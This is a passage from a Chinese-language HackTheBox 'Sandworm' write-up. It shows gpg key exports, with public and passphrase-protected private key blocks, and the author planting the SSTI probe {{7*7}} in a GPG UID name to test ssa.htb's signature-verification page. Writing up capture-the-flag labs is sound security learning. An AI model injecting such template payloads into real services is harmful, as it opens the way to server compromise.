BLOCK-----\n\n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\n=4ri8\n-----END PGP PRIVATE KEY BLOCK-----\n```\n\n## 制作和验证签名\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# echo 'life-time'|gpg --clear-sign      \n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA512\n\nlife-time\n-----BEGIN PGP SIGNATURE-----\n\niQGzBAEBCgAdFiEEmdxh848T1r2yc2sljiKfWGUL+z4FAmSdlaYACgkQjiKfWGUL\n+z5I9Qv/fqJwqwWkOVx7erSjHkXOIdBwpDOrNutgRZNpV2ONddBViAaIIW81ctJH\nTbktO6A+lgnSdLMgXa15RXKsyfpWyk7tJAAjDvmZzhlAmPyRCK1odS1oqWxjSwxx\nYhjVY0SmV4To7VuGv3kccnMCKJpRmo2K7LREfjej7Uy0qgcKKUpb6wSfMu856vl0\nVCHeKtYM0RwckgqcGlTB/aT1ThzBVb+MGEiFaiVhUrRsznM+N++AK6oM0HCjqHXV\nCcI6Y/BR65z/CAo4adrqFqmRzQJ8I9KqCdjePXqrvs1VIQGas1kvtjCGizX6zWUO\niZC9GgybJSeEA/v1ng8GeFxBRX3K1irt4nNIzv+ke/6Xg3csfwQT+UAOC4nsDkQG\n4PsHpvtxBlRLf4pdY0lYma97/OX+PPGEBudh997h+6nDEDKlUMwA71OYUk7w5uEW\nEWpIVE31L0PwLRVQR5bEsVkzErSBmaaQZaF7CSaHAxPp4IukrlfyvbyLgaii58d5\nAIRSUmnE\n=QNzT\n-----END PGP SIGNATURE-----\n```\n\n## GPG 验证\n\n![image-20230629223506555](Hackthebox-Sandworm/image-20230629223506555.png)\n\n去 https://ssa.htb/guide 验证一下我们的 GPG 密钥\n\n在回显中，我们在创建 GPG 密钥的时候输入的 name，也就是 Lucifiel 显示在回显中了，我怀疑这里有 SSTI，去重新生成尝试一下\n\n## SSTI\n\n> https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/\n\n找到了一篇修改 GPG UID 的相关文章\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg --edit-key LucifielHack@qq.com\ngpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\n私钥可用。\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1). Lucifiel <LucifielHack@qq.com>\n\ngpg> adduid\n真实姓名： {{7*7}}\n电子邮件地址： LucifielHack@qq.com\n注释： \n您选定了此用户标识：\n    “{{7*7}} <LucifielHack@qq.com>”\n\n更改姓名（N）、注释（C）、电子邮件地址（E）或确定（O）/退出（Q）？ o\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)  Lucifiel <LucifielHack@qq.com>\n[ 未知 ] (2). {{7*7}} <LucifielHack@qq.com>\n```\n\n生成好了一个新的 UID，现在我们去提升它的信任等级\n\n```\ngpg> trust\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)  Lucifiel <LucifielHack@qq.com>\n[ 未知 ] (2). {{7*7}} <LucifielHack@qq.com>\n\n请决定您对这名用户能否正确地验证其他用户密钥\n（通过查看护照，检查不同来源的的指纹等等）的相信程度\n\n  1 = 我不知道或不作答\n  2 = 我不相信\n  3 = 我勉强相信\n  4 = 我完全相信\n  5 = 我绝对相信\n  m = 回到主菜单\n\n您的决定是什么？ 5\n您真的要把这个密钥设置成绝对信任？(y/N) y\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)  Lucifiel <LucifielHack@qq.com>\n[ 未知 ] (2). {{7*7}} <LucifielHack@qq.com>\n\ngpg> uid 1\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 绝对 ] (1)* Lucifiel <LucifielHack@qq.com>\n[ 未知 ] (2). {{7*7}} <LucifielHack@qq.com>\n\ngpg> deluid\n真的要移除此用户标识吗？(y/N) y\n\nsec  rsa3072/8E229F58650BFB3E\n     创建于：2023-06-29  有效至：2025-06-28  可用于：SC  \n     信任度：绝对        有效性：绝对\nssb  rsa3072/DA683892A79B6B19\n     创建于：2023-06-29  有效至：2025-06-28  可用于：E   \n[ 未知 ] (1). {{7*7}} <LucifielHack@qq.com>\n\ngpg> save\n```\n\n这样就搞定了\n\n### 导出公钥\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg -a -o public.key --export {{7*7}}\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# cat public.key      \n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\nBiwNF0LUjNFQf3rBzKxViXyy51/Z\n=73Dn\n-----END PGP PUBLIC KEY BLOCK-----\n```\n\n### 导出私钥\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg -a -o private-file.key --export-secret-keys {{7*7}}\n```\n\n```\n┌──(root㉿kali)-[~/Desktop]\n└─# cat private-file.key \n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\nlQWGBGSdlHIBDADT20d9aSJjEaF5etEV39gJBLc7c35Q7cgwBUi9aW0FcrcYYWV5\nAJJ2xloIWbavsgG1bjPo2SwgP0iRscX6yFRQ21OtVibkWB6fRfi7BWxc/mxEo0XU\nlFO4ufb2taRMRmlxvg78xwia7WXIVF+UR/iHJeH/U+UbVh0hFZNQKrKiRHlzWagb\nyGhNz8LDHMIPWUp1AiVqoMNXv4TwRM+SUMsQi7K862oixnJAjrgThIn6bwOPNnPm\nspi7QUj8JcjEBvicVXlCaD1WkfkeNDHMq1xH3LW5/2gzTauouLsxBdAv3soImLXE\nhuyxG5arc6oekAGJ3wpizA1g8pJQ5DnUUe419cBnL0M+tMgZMboOauEOP1BLD9ZH\npwaktBoQnUXaj4jY3jHFHhyP+rWDvcFJshm/zy05nAKqRtA8cidlYtEpAuJrAArM\nhwg6v73HVkpjiSWFihYRZhBUtjJsEekUzx7eyZtkb+KH7wmBqEgpBPoNZJR7HjD5\nSohFOy3XWJe87UcAEQEAAf4HAwLZrvJmzrDHiP+tyzpcbjR3YiPG9nYCCYqKPhUv\nMKnY4hjS41G/15Ou88mPYhMOlEBgE1iXUkhh/dIzV8IJVIlR/eC/bPATr5zYksDD\n2REoCSaWrD2gGL1fG5dVl1XSIEzdBxSrCSu+OK1bz05rnpQg/vGHmNNlamUzxAvr\nN1O0K4tyKafmiXCFoOQDYsCsifIePWDP3Nzq4EWXDPwRg1gbI1Y1qc0L/2W+6WnK\nM435B83SDRlGw7x4ddSzvpf9c/UBNHan2z1EpInn7NngKcMuL0XuLaEUUOt8Ucgu\n7FhcR4F6MRvOQk22Ezv2NzWrPSMPCisevGEcwK3fmtGN6yVJFpR3yq4meF5wehvJ\n/FSVfsgmo7YQ01h1jBkrClLJVPvZfrOujM2VR3BULY2WUjMUdteiv5zPy1P+hZBk\nL/MuGPsWFFcyotVF/on+SKyrqG1xXF5Xcg0wN359/wfRN6fPFjdlGzWZifYQUIRC\nNxcs0fXpsNwFSTJrz6NwJR9O+8kbQJu5/05jn9eVfJeavuz5vvQnV+gD59Ft3Tyv\nGZnDv4T3fboUNYGDKgZ7eeVgqDse80Xj8HjbkUP8XRa4d5f0WgguephEfBpdUVPR\n56fdimmryXAwF/Ycs4VVjlwrmmlouUHUsu5f8z1FLY095v4OzeUIgHVY9oKQ2uyz\n2g857BQQGhf5wI/UlvjhIEcXbtOOlVHHj5DIXmknR2NlHcV1tJ3FIbdQQTPBXsjX\nuWtKa2tKr3MhfIOnF8EASGTIiRhE3wDBPtlBE4phimf6uWN/N6eAdfuk+bKvo9ap\noxGllCpBhmKXXi8kK2YO63dYo5BChHTjg/3Hb5jvxpaVb89MpYkyU/EpyskuPy/z\nsAkcxrDqR+8hHnajIwd5PwDnkJrrmZdrSHQNYxc94nQHkIdOW6KLjLabH+HjKd+6\nXbxnbplfEMN50gJB3Y5NXcbonaPBlFMZ6F8c/YjfHbCNPGD4ZQwmJW2mmt4vdhV5\nCly7OWpwQlk/Qfhc70/D1EUCaWbwDa8AbKWAZ4wYZ8FxsmsNtxTqsePNSUe8t7f6\nTlCcOSMDH//hkLj8LJ5u2B1WPrUhe9vQOeNJe2uJzyStfhGCDFfgSn0CwtWwrKQa\n8R5jKQTCZMcXjXqKRSOk+8qWuWzkJeTqtRwsNvTIA9cjOqdiBCuGBHTDJeqNip1d\nQ9rVkYhmZLWqJvgx94Xh66DUWKpFIK2LkpNVAtY6mKR5CCT9VCpQdjWV3EY50ULr\n6p25HxJ2ANttbaapnjVyClWN89iQ397YvO853pm0IDDnsLLeMLtP0bpXm2vEjYkg\nrbQbZrzN/bc5bkBnZnMiIPBIDGJGZn767bQde3s3Kjd9fSA8THVjaWZpZWxIYWNr\nQHFxLmNvbT6JAdQEEwEKAD4WIQSZ3GHzjxPWvbJzayWOIp9YZQv7PgUCZJ2XsAIb\nAwUJA8JnAAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRCOIp9YZQv7Pv8EDACR\nY90iKIY/fjoIk0zQMIIRLIERATPfzGBv4pnqr3SgJ1kHA6EUR9HF0IzFl3AdOG4u\ncVlU7whw58cu8OT1Yy8JMhmpZW4OAocieJSsNZCx03fLlv5FoOb+ye3H/NUCh9M2\nAMRDQyk2/0apeAe9kkSF82npQHbRhWnsL03lzZ8z35GMwR4YsnsDYBnLX9Po19s2\nLVQjJuQCg2iNpKybZ88cXyu+PgQDDR+xyZPqVxlROD0oFkSA5PvPvGHCHdvrkCbX\nHFBPOBwmtHxe+eS4+SBX/4EN44C0KT1vFVrOu82FYLZmi1GqNl2U/pwmvU1Qd4KU\nBrMRb4bey1TOg2mCax2VP5H4t/0VM5aSOmMEJijhp9h3CPaymxgPVq06Gm0OLLtN\nUw5BRl+COg3/jT0EpmcLRAtJ83mILvb7e7io23DesECIPqi8z8F326xajKOlm+4l\nXLp/MFRa5UHQqoGmkxQcTIqAIvvi6FGof7DgZCkWV8vnQn9qPZn5it1fKkXFnAqd\nBYUEZJ2UcgEMANbLfcUVhcrdZuaRl4NnmzKabZ3swIZmBSO5ICQCw12Jqr6KlVa2\nvFPtdOdTMnJwrGGJYqCEamek4M6RILovlxOfdDLaY+49TjEnDev+6GRk18OAO6gk\nMYPpCfuBFk3XIK49p3BH9ucJQzMvJ6oa29L2a/pmlw5kA/aUDUteXJZUfHSYSd91\nMBQQ8oIUzHe2SDB9effwtKWdM6IjWviZ5TpILF8v4HItueVE5dinxTZIaxHko0d0\nRcEQV9zdjkZ1ZQjFVJr5Awz6JQGhf7lcPN60YxZAv++3hbtN7tv7l3jJuWxdDwsB\nAAgOxuzk9Y7QmFdNAW9xhSLL3Ee4cWaj+RXq5hP9Cw60MzfpDaXHyY/TOtCC6VU3\nu6ERRAfQ0GwmfSHzJZJtIVCu08NE3SOriLHbvGggdUTwlXtqaHg4PfLMwvMEEHN3\nw/PmLGAE4bPmjUIB9tieloLMW/aJA79W7kcKpsy355dEZUojtzX7kRXm+ud30hqY\nUKrVy5EvGypDkQARAQAB/gcDAnC+YHT/eqqz/wW531YE9rJbRT/T7HoqKOMo9FiQ\n2TT/UNYkotoMBvhw4HWAgulEF3XSDv02kT2GCiOjqS9nvZKAq+my7XP71Ao8lDMr\n59xguJCZQKdZjdkhFhUx18H/4qumFXfFzTBpjk/VDBepXn2QGVtK8oTGIt7V7S0q\nq6kM5BkGhSp8+69ic0+4gltuM1EyU8LCJTuRiCmBT3zCPitK3AM1pzDqd7WptZAl\nucIGJhl6z6mqKLUvv073yQMtwuZF3PXqvBRBbq3rEaslPTiwyI4VpaAXwayk5UT5\nTUePOYbLHO/7ZxDme3Z/zVl6VfONq7zQbeHjOooT3LZuArHssAppvTGObPxaAP92\nQf/+q7W/3sbFvzcimniz1dNVO705KQPqsHCNYpQtkL/Ox2W+Pwtc0RTKwk7raD3z\njfi9a5xgo9oVgL8mKK3rguW+wwo+e9TUTDHKM9wRM58qO9SVqRtXII0G9Mg4Q9fK\nebZLAEkh8JZXJ4PTr3ZDZUQigW5nNw2mReWlyJKe1bEIjSSziufMesyyu1Q6At5a\nHL6NZfNkB1e7L42wWGVAAqXM7lGZVLiHQSIfZZkCqdorsyU6MOt6efF7iq5WS7bv\nSKzZeD74bSzYgVGGV4LIeEMsuGbCJBf9K4tK26C0PSQVKImRpDczlGgz0xqKiBRD\n27paOB8IPn5NRbLTLQIzdxLU8/Qc5bYmtYjVIflSJymTEiNRzQIrONby2whAvQk9\n6m3QfOEIDZIZ7P3wEe6IMCoVJj7sxWWGSpKdIH5uVqSJkYGz5pK6+Kaoc5y2cgPA\nl+pBXPl6TSKDaQa635RQQGeI/leHzxgk1R7PCFh07ybbVdW6cXsSI2pNj/v9sBbJ\nE4am1ILz2B8EIu++NgM8mL+N1PwzK6BQXXM6J5nQ00LA5dvpr3NzDtago3zi7iko\n+vWOHqFXDaKN94aJScw3cYdwESJnDZRy8B78TJuid6LNktXIYlPXe3QsJABgTsLb\nJ0Wcl61i8qKykjPAHJDLszLUOucFO1Kl2iQufxHuzLi55tuefFJHFq/TD7p22OyO\nI3UQZcOmbWGm3MCD/zshfZMkLe2NXh1o7TTu2MQ2Vkka8QgsW2nACBBDq3VTZf+n\nVsR/couo7EPB/Pj3E78a0/MmEKlLQ08YNhfeBggt4TTzcNeWWZnyuQbEJpN5f6t1\nlFWP5cnJcdjXVbCeq52UlFpJ5VddaJz2+Ln1Wi9HMwwpdkg4NSZSI/GF9pxaGZZa\nIlV93Tba+xrWIgYBZfnSc1d/or8x7s8+LhU3pB8Hknxy7hm0s7hMA+0ZAxZhhjTO\nSA/PYpvr8WV9wSsDd1v8CT9IwlSYlf6JAbwEGAEKACYWIQSZ3GHzjxPWvbJzayWO\nIp9YZQv7PgUCZJ2UcgIbDAUJA8JnAAAKCRCOIp9YZQv7PtxeC/4u+2QE10yqDkZw\nbf78vLoHWiz+ORHdHRs47bsKtQ7D9i3gpjvX8TNrf56+J3q7eqYGNVoiDT2pl0PJ\nJOFX/BVfTM/UfT3mchw0LGoW3xggyPH1V/IjjIJhNZUQRg+WBNUQ+SkkQWt33y/0\ndLeVlsQnkdonF2nn+fT0eHN8IfI2jiVVKCR4mvtmjfv+2mkhQCAhZHNceD5/R27T\nTzsrxDQpU7w6Qq18ahdYH/jCs8x5AxVo6R7lKM3dPTc4auK3jrbBiLghq5xtyTqo\njceMsKyNBq0Y1XbIhtVuEgfWgDOe7oZ3dfFsOtc4u9a23xGRYMM9tuXP/YSILXhU\n+GQ+0l72jS2CvKomLFV8WN2VNT7